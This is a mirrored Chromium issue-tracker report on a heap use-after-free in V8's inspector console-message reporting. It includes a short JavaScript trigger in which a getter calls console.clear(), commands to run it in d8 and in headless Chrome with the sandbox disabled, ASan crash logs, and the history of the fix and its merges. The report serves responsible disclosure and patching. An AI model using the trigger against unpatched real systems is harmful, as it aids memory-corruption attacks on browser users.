# Heap use-after-free in v8_inspector::V8DebuggerAgentImpl::setBreakpointByUrl

| Field | Value |
|-------|-------|
| **Issue ID** | [485672657](https://issues.chromium.org/issues/485672657) |
| **Status** | Assigned |
| **Severity** | Unknown |
| **Priority** | P2 |
| **Component** | Platform>DevTools |
| **Platforms** | Linux, ChromeOS |
| **Reporter** | ma...@gmail.com |
| **Assignee** | sz...@google.com |
| **Created** | 2026-02-19 |
| **Bounty** | Confirmed (amount unknown) |

## Description

---

## VULNERABILITY DETAILS

### Summary

A Heap-Use-After-Free (UAF) vulnerability exists in `V8RuntimeAgentImpl::enable`. The function iterates over cached console messages to report them to the frontend. The iteration loop uses a cached size and an index, but the check to detect if the message storage was modified (`if (size < messages.size())`) is insufficient. It fails to detect if the storage was cleared (e.g., via `console.clear()`) during the iteration. If a message formatting operation triggers a side effect (like a getter) that clears the console, the loop continues and accesses freed memory, leading to a UAF crash.

### Detail

The vulnerable code is in `src/inspector/v8-runtime-agent-impl.cc`:

```
// src/inspector/v8-runtime-agent-impl.cc:1119
  const auto& messages = storage->messages();
  const size_t size = messages.size();
  for (size_t i = 0; i < size; ++i) {
    if (size < messages.size()) {
      // Also guard against the case where the message queue was cleared.
      break;
    }
    if (!reportMessage(messages[i].get(), false)) {
      break;
    }
  }

```

The loop iterates `size` times. Inside the loop, `reportMessage` is called. This function eventually calls `V8ConsoleMessage::wrapArguments`, which wraps JS objects. Wrapping an object (specifically an `Error` object) can trigger property getters (e.g., `name` or `message` to build the description).

If a malicious script defines a getter that calls `console.clear()`, the `messages` deque in `V8ConsoleMessageStorage` is cleared. `messages.size()` becomes 0.

The check `if (size < messages.size())` compares the original size (e.g., 1) with 0. Since `size_t` is unsigned, `1 < 0` is false. The loop does NOT break.
The code then executes `messages[i].get()`. Since `messages` is empty, this accesses invalid memory (the freed elements of the deque), resulting in a Heap-Use-After-Free.

### Fix Suggestion

The loop condition should check if the index is still within bounds:

```
    if (i >= messages.size()) {
      break;
    }

```
## VERSION

V8 Commit: `7f3825903cdc2eb341462710172b73dc5ca9215d`

## REPRODUCTION CASE

Save the following as `reproduce_uaf.js`:

```
function sendCommand(method, params) {
    var msg = JSON.stringify({id: 1, method: method, params: params});
    send(msg);
}

sendCommand("Console.enable", {});

var error = new Error();
Object.defineProperty(error, 'name', {
    get: function() {
        console.clear();
        return "boom";
    }
});

console.log(error);

sendCommand("Runtime.enable", {});

```

Run with d8 (ASAN build):

```
./out/asan/d8 --enable-inspector reproduce_uaf.js

```
## CRASH LOG

```
==312497==ERROR: AddressSanitizer: heap-use-after-free on address 0x7935abde28c0 at pc 0x7c25b6460947 bp 0x7ffdf492f910 sp 0x7ffdf492f908
READ of size 8 at 0x7935abde28c0 thread T0
    #0 0x7c25b6460946 in v8_inspector::V8ConsoleMessage::wrapArguments(v8_inspector::V8InspectorSessionImpl*, bool) const gen/third_party/libc++/src/include/__vector/vector.h:393:41
    #1 0x7c25b6460df9 in v8_inspector::V8ConsoleMessage::reportToFrontend(v8_inspector::protocol::Runtime::Frontend*, v8_inspector::V8InspectorSessionImpl*, bool) const src/inspector/v8-console-message.cc:366:21
    #2 0x7c25b6525f30 in v8_inspector::V8RuntimeAgentImpl::enable() src/inspector/v8-runtime-agent-impl.cc:1210:12
    #3 0x7c25b6413f81 in v8_inspector::protocol::Runtime::DomainDispatcherImpl::enable(v8_crdtp::Dispatchable const&) gen/src/inspector/protocol/Runtime.cpp:943:44
...
0x7935abde28c0 is located 128 bytes inside of 208-byte region [0x7935abde2840,0x7935abde2910)
freed by thread T0 here:
    #0 0x5ac4fd8a3362 in operator delete(void*, unsigned long) (/home/leo/v8/v8_src/v8/out/asan/d8+0x1c2362) (BuildId: ed05d108d1c556c4)
    #1 0x7c25b6466c09 in std::__Cr::deque<std::__Cr::unique_ptr<v8_inspector::V8ConsoleMessage, std::__Cr::default_delete<v8_inspector::V8ConsoleMessage>>, std::__Cr::allocator<std::__Cr::unique_ptr<v8_inspector::V8ConsoleMessage, std::__Cr::default_delete<v8_inspector::V8ConsoleMessage>>>>::clear() gen/third_party/libc++/src/include/__memory/unique_ptr.h:74:5
    #2 0x7c25b6464e3c in v8_inspector::V8ConsoleMessageStorage::clear() src/inspector/v8-console-message.cc:608:14
...

```
## BISECT

The vulnerability was introduced in commit `61a4138392a8712c8697ef13f237c3961ac2a90a`

```
commit 61a4138392a8712c8697ef13f237c3961ac2a90a
Author: Benedikt Meurer <bmeurer@chromium.org>
Date:   Tue Nov 11 11:53:43 2025 +0100

    Guard against iterator invalidation when reporting console messages.
    
    When reporting queue console messages to the frontend in the Runtime
    agent, we might end up calling back into JavaScript (via some of the
    ValueMirrors that still use side-effecting implementations), and that
    can invalidate the deque iterators. This doesn't happen in current
    Chromium versions, but it's still a good idea to guard against this
    case.
    
    Fixed: 446941355
    Also-By: sami.liedes@gmail.com
    Change-Id: I779df1411f49cad70dbe5127527e27f2029caa37
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7137622
    Commit-Queue: Simon Zünd <szuend@chromium.org>
    Auto-Submit: Benedikt Meurer <bmeurer@chromium.org>
    Reviewed-by: Simon Zünd <szuend@chromium.org>
    Cr-Commit-Position: refs/heads/main@{#103648}

```
## CREDIT INFORMATION

Reporter credit: Zhenpeng (Leo) Lin at depthfirst

## Attachments

- [reproduce_uaf_insepctor.js](attachments/reproduce_uaf_insepctor.js) (text/javascript, 469 B)
- [reproduce_uaf_insepctor_asan.log](attachments/reproduce_uaf_insepctor_asan.log) (text/plain, 15.5 KB)
- [chrome_inspector_uaf.html](attachments/chrome_inspector_uaf.html) (text/html, 369 B)
- [talk_to_chrome.py](attachments/talk_to_chrome.py) (text/x-python, 1.5 KB)
- [chrome_asan.log](attachments/chrome_asan.log) (text/plain, 15.4 KB)

## Timeline

### is...@chromium.org (2026-02-19)

Thank you for the report!

Assigning to DevTools folks.

### ya...@google.com (2026-02-20)

As with some of the other vulnerability reports: it's unclear to me whether this can happen to Chrome users. The reproduction case uses d8 with --enable-inspector, which is a barebone embedding of V8 inspector. The point of d8 is to be simple to understand and reason about. It's not shipped as a product.

That said, we should at least check whether this can be triggered in DevTools as well.

Benedikt, please take a look at this. Thanks.

### sz...@google.com (2026-02-20)

For the future, the reproduction cases should either use puppeteer (with raw CDP access) against an ASAN build of chrome, or an [`inspector-protocol`](https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/web_tests/http/tests/inspector-protocol/) web tests against an ASAN build of content\_shell. This also applies to e.g. [issue 485683106](https://issues.chromium.org/issues/485683106).

If you file the bug with `d8 --enable-inspector`, we might wrongly categorize it as a P4 bug even though it could be an actual vulnerability.

### ch...@google.com (2026-02-20)

Setting milestone because of s0/s1 severity.

### ma...@gmail.com (2026-02-21)

Make sense, will do, thanks for the heads up!

### dx...@google.com (2026-02-24)

Project: v8/v8  

Branch:  main  

Author:  Danil Somsikov [dsv@chromium.org](mailto:dsv@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7600292>

Fix Use-After-Free in console message reporting.

---


Expand for full commit details
```
     
    When enabling the Runtime or Console agent, cached console messages are reported. The process of reporting a message can execute JavaScript, which might modify the console message storage (e.g., by calling `console.clear()`). To prevent Use-After-Free issues caused by iterating over a modified container, the current message us now copied and the index is re-checked against the container bounds. This ensures that the reporting loop operates on a stable set of messages, even if JavaScript re-enters and clears the console. 
     
    Bug: 485672657 
     
    Change-Id: Ic5a1887997901ca93df1e1f63c9dc148c9755d89 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7600292 
    Auto-Submit: Danil Somsikov <dsv@chromium.org> 
    Reviewed-by: Benedikt Meurer <bmeurer@chromium.org> 
    Reviewed-by: Simon Zünd <szuend@chromium.org> 
    Commit-Queue: Benedikt Meurer <bmeurer@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#105402}

```

---

Files:

- M `src/inspector/v8-console-agent-impl.cc`
- M `src/inspector/v8-console-message.cc`
- M `src/inspector/v8-console-message.h`
- M `src/inspector/v8-runtime-agent-impl.cc`
- A `test/inspector/runtime/regress-485672657-expected.txt`
- A `test/inspector/runtime/regress-485672657.js`

---

Hash: [47a3dfaccda94a78dab9cd770999c60a68c33507](https://chromiumdash.appspot.com/commit/47a3dfaccda94a78dab9cd770999c60a68c33507)  

Date: Mon Feb 23 13:13:08 2026


---

### ch...@google.com (2026-02-24)

Security Merge Request Consideration: This is sufficiently serious that it should be merged to stable. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M145. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request Consideration: This is sufficiently serious that it should be merged to beta. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M146. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### ch...@google.com (2026-02-25)

Merge review required: M146 has already been cut for stable release.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: lmenezes (ChromeOS), srinivassista (Desktop US), None (Desktop EMEA), govind (Mobile US), eakpobaro (Mobile EMEA)

### ch...@google.com (2026-02-25)

Merge review required: M145 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: andywu (ChromeOS), srinivassista (Desktop US), None (Desktop EMEA), harrysouders (Mobile US), eakpobaro (Mobile EMEA)

### dr...@chromium.org (2026-02-26)

No crashes yet in Canary. Approved to merge. I don't see anything here that suggests it's M145+ only, so also approving a merge for Extended Stable.

### dr...@chromium.org (2026-03-02)

Given the timing of the M145 release cut, I don't think this will be in M146. This should still be merged to M146 by 12pm PST tomorrow.

### ch...@google.com (2026-03-03)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### dx...@google.com (2026-03-03)

Project: v8/v8  

Branch:  chromium/7680  

Author:  Danil Somsikov [dsv@chromium.org](mailto:dsv@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7626742>

[M146] Fix Use-After-Free in console message reporting.

---


Expand for full commit details
```
     
    When enabling the Runtime or Console agent, cached console messages are reported. The process of reporting a message can execute JavaScript, which might modify the console message storage (e.g., by calling `console.clear()`). To prevent Use-After-Free issues caused by iterating over a modified container, the current message us now copied and the index is re-checked against the container bounds. This ensures that the reporting loop operates on a stable set of messages, even if JavaScript re-enters and clears the console. 
     
    Bug: 485672657 
     
    Change-Id: Ic5a1887997901ca93df1e1f63c9dc148c9755d89 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7600292 
    Auto-Submit: Danil Somsikov <dsv@chromium.org> 
    Reviewed-by: Benedikt Meurer <bmeurer@chromium.org> 
    Reviewed-by: Simon Zünd <szuend@chromium.org> 
    Commit-Queue: Benedikt Meurer <bmeurer@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#105402} 
    (cherry picked from commit 47a3dfaccda94a78dab9cd770999c60a68c33507) 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7626742 
    Commit-Queue: Danil Somsikov <dsv@chromium.org>

```

---

Files:

- M `src/inspector/v8-console-agent-impl.cc`
- M `src/inspector/v8-console-message.cc`
- M `src/inspector/v8-console-message.h`
- M `src/inspector/v8-runtime-agent-impl.cc`
- A `test/inspector/runtime/regress-485672657-expected.txt`
- A `test/inspector/runtime/regress-485672657.js`

---

Hash: [47b09a8fcdd9e99f6a49abeaa95ab25d985b58a6](https://chromiumdash.appspot.com/commit/47b09a8fcdd9e99f6a49abeaa95ab25d985b58a6)  

Date: Mon Feb 23 13:13:08 2026


---

### pe...@google.com (2026-03-03)

LTS Milestone M144

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### dx...@google.com (2026-03-03)

Project: v8/v8  

Branch:  chromium/7680  

Author:  Harry Souders [harrysouders@google.com](mailto:harrysouders@google.com)  

Link:    <https://chromium-review.googlesource.com/7630295>

Revert "[M146] Fix Use-After-Free in console message reporting."

---


Expand for full commit details
```
     
    This reverts commit 47b09a8fcdd9e99f6a49abeaa95ab25d985b58a6. 
     
    Reason for revert: Breaking the M146 branch 
     
    Bug: 489458474 
     
    Original change's description: 
    > [M146] Fix Use-After-Free in console message reporting. 
    > 
    > When enabling the Runtime or Console agent, cached console messages are reported. The process of reporting a message can execute JavaScript, which might modify the console message storage (e.g., by calling `console.clear()`). To prevent Use-After-Free issues caused by iterating over a modified container, the current message us now copied and the index is re-checked against the container bounds. This ensures that the reporting loop operates on a stable set of messages, even if JavaScript re-enters and clears the console. 
    > 
    > Bug: 485672657 
    > 
    > Change-Id: Ic5a1887997901ca93df1e1f63c9dc148c9755d89 
    > Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7600292 
    > Auto-Submit: Danil Somsikov <dsv@chromium.org> 
    > Reviewed-by: Benedikt Meurer <bmeurer@chromium.org> 
    > Reviewed-by: Simon Zünd <szuend@chromium.org> 
    > Commit-Queue: Benedikt Meurer <bmeurer@chromium.org> 
    > Cr-Commit-Position: refs/heads/main@{#105402} 
    > (cherry picked from commit 47a3dfaccda94a78dab9cd770999c60a68c33507) 
    > Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7626742 
    > Commit-Queue: Danil Somsikov <dsv@chromium.org> 
     
    Bug: 485672657 
    No-Presubmit: true 
    No-Tree-Checks: true 
    No-Try: true 
    Change-Id: Ibd4a3d81ea11ea80e23a8b46dd57dca1a7237e6a 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7630295 
    Owners-Override: Krishna Govind <govind@chromium.org> 
    Commit-Queue: Harry Souders <harrysouders@google.com> 
    Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com>

```

---

Files:

- M `src/inspector/v8-console-agent-impl.cc`
- M `src/inspector/v8-console-message.cc`
- M `src/inspector/v8-console-message.h`
- M `src/inspector/v8-runtime-agent-impl.cc`
- D `test/inspector/runtime/regress-485672657-expected.txt`
- D `test/inspector/runtime/regress-485672657.js`

---

Hash: [9ba5676bb7ad12cc3339037647106ac374e3ba0f](https://chromiumdash.appspot.com/commit/9ba5676bb7ad12cc3339037647106ac374e3ba0f)  

Date: Tue Mar 3 21:19:26 2026


---

### va...@google.com (2026-03-04)

Please merge the fix asap to the correct branch: refs/branch-heads/14.6. Docs: <https://v8.dev/docs/merge-patch#how-to-create-the-merge-cl>

I can't CP it as there is a conflict.

### dx...@google.com (2026-03-04)

Project: v8/v8  

Branch:  refs/branch-heads/14.6  

Author:  Danil Somsikov [dsv@chromium.org](mailto:dsv@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7633544>

[M146] Fix Use-After-Free in console message reporting.

---


Expand for full commit details
```
     
    When enabling the Runtime or Console agent, cached console messages are reported. The process of reporting a message can execute JavaScript, which might modify the console message storage (e.g., by calling `console.clear()`). To prevent Use-After-Free issues caused by iterating over a modified container, the current message us now copied and the index is re-checked against the container bounds. This ensures that the reporting loop operates on a stable set of messages, even if JavaScript re-enters and clears the console. 
     
    Bug: 485672657 
     
    (cherry picked from commit 47a3dfaccda94a78dab9cd770999c60a68c33507)[ 
     
    Change-Id: Ic5a1887997901ca93df1e1f63c9dc148c9755d89 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7600292 
    Auto-Submit: Danil Somsikov <dsv@chromium.org> 
    Reviewed-by: Benedikt Meurer <bmeurer@chromium.org> 
    Reviewed-by: Simon Zünd <szuend@chromium.org> 
    Commit-Queue: Benedikt Meurer <bmeurer@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#105402} 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7633544 
    Reviewed-by: Lutz Vahl <vahl@chromium.org> 
    Commit-Queue: Danil Somsikov <dsv@chromium.org> 
    Cr-Commit-Position: refs/branch-heads/14.6@{#21} 
    Cr-Branched-From: e04c3a1a2543bdbee7beac8846c9cbe8f657636f-refs/heads/14.6.202@{#1} 
    Cr-Branched-From: 3b0b01e6594ec362369dc16f069012a81748c8ba-refs/heads/main@{#105132}

```

---

Files:

- M `src/inspector/v8-console-agent-impl.cc`
- M `src/inspector/v8-console-message.cc`
- M `src/inspector/v8-console-message.h`
- M `src/inspector/v8-runtime-agent-impl.cc`
- A `test/inspector/runtime/regress-485672657-expected.txt`
- A `test/inspector/runtime/regress-485672657.js`

---

Hash: [f0f1ec193cafd4d01b8a08778796a490336f18d2](https://chromiumdash.appspot.com/commit/f0f1ec193cafd4d01b8a08778796a490336f18d2)  

Date: Mon Feb 23 13:13:08 2026


---

### qk...@google.com (2026-03-05)

Added `LTS-NotApplicable-138` and `LTS-NotApplicable-144` label because the suspected CL[1] was not included in M138 and M144.

[1] <https://chromium-review.googlesource.com/c/v8/v8/+/7137622>

### aj...@google.com (2026-03-05)

Marking as type=bug as a Chrome poc has not been provided.

### sp...@google.com (2026-03-05)

*NOTE: This is an automatically generated email*

Hello,

Chrome Vulnerability Rewards Program (VRP) Panel has decided that the security impact of this
issue does not meet the criteria to qualify for a reward.

Rationale for this decision:

This has been classified as a bug and thus not eligible.

Note that the fact that this issue is not being rewarded does not mean
that the product team won't fix the issue. We have filed a bug with the product
team and they will review your report and decide if a fix is required. We'll
let you know if the issue was fixed.

Regards,   

Google Security Bot

*How did we do? Please fill out a [short anonymous survey](https://goo.gl/IR3KRH).*

### ma...@gmail.com (2026-03-06)

Hello,

I apologize for not providing enough details in my previous report. I assumed showing memory corruption in d8 was sufficient to demonstrate memory corruption in Chrome. This was my oversight, as I didn't thoroughly review the VRP policy. However, my intention is never to waste your time on trivial issues, and I am happy to help improve Chrome's security. Going forward, I will ensure my reports clearly demonstrate security impact in chrome and include clear reproduction steps.

As per comment [#18](https://issuetracker.google.com/u/1/issues/483853098#comment18) in another issue, I want to argue this bug can actually lead to memory corruption in chrome. I have successfully reproduced this issue in both inspector-test and chrome.

### Reproducing with inspector-test

using `test/inspector/protocol-test.js` under v8 project, please first build `inspector-test` with asan enabled, then run

```
./out/debug_asan/inspector-test test/inspector/protocol-test.js reproduce_uaf_inspector.js

```

You will observe the ASan crash log attached.

### Reproducing with chrome

I used pre-compiled chrome, version `chromium-145.0.7632.109-linux-asan`, in one terminal, run

```
chromium-145.0.7632.109-linux-asan/chrome \   
  --headless=new \
  --no-sandbox \
  --disable-gpu \
  --remote-debugging-port=9225 \
  "--remote-allow-origins=*" \
  --user-data-dir=/tmp/chrome-uaf-profile3 \
  "file://chrome_inspector_uaf.html"

```

Then in another terminal, run

```
python3 talk_to_chrome.py 9225

```

You will see the chrome terminal crashed with ASAN logs, which I have put in the attachment.

Please feel free to let me know if you have any concerns, I am all ears :)

Best,

Leo

### aj...@google.com (2026-03-09)

Hello please open a new report with a complete description.

### aj...@google.com (2026-03-10)

apologies! the additional information is helpful thanks.

### ch...@google.com (2026-06-03)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

## Bounty Award

> This has been classified as a bug and thus not eligible.
> 
> 
> Note that the fact that this issue is not being rewarded does not mean
> that the product team won't fix the issue. We have filed a bug with the product
> team and they will review your report and decide if a fix is required. We'll
> let you know if the issue was fixed.
> 
> Regards, \
> Google Security Bot
> 
> *How did we do? Please fill out a [short anonymous survey](https://goo.gl/IR3KRH).*

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/485672657)*
